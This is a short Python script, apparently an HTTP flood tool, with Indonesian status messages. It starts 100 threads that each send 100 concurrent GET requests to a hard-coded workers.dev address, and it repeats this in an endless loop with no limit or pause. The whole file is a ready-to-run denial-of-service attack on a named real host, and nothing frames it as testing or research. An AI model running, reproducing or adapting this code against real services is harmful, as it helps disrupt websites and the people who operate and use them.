import asyncio
import aiohttp
import threading

async def fetch_url(url):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as response:
                response_text = await response.text()
                if response.status == 200:
                    return "Sukses"
                else:
                    return f"Kesalahan: Kode status {response.status}"
    except Exception as e:
        return "Kesalahan"

def fetch_in_thread(url, num_requests):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    responses = loop.run_until_complete(fetch_multiple_urls(url, num_requests))
    loop.close()
    return responses

async def fetch_multiple_urls(url, num_requests):
    tasks = []
    for _ in range(num_requests):
        task = asyncio.ensure_future(fetch_url(url))
        tasks.append(task)
    return await asyncio.gather(*tasks)

def main():
    url = "https://sxtcp.tg-index.workers.dev"
    num_requests = 100
    num_threads = 100

    while True:
        print("Program berjalan...")
        thread_list = []

        for _ in range(num_threads):
            thread = threading.Thread(target=fetch_in_thread, args=(url, num_requests))
            thread_list.append(thread)
            thread.start()

        for thread in thread_list:
            thread.join()

if __name__ == "__main__":
    main()
